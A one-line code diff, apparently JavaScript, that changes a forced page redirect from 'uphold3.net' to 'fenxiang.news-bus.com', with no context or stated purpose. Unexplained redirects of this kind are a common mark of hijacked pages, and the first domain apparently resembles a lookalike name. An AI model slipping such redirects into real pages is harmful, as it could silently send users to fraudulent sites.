@@ -1,1 +1,1 @@
-window.location.href ='https://uphold3.net'
+window.location.href ='https://fenxiang.news-bus.com'
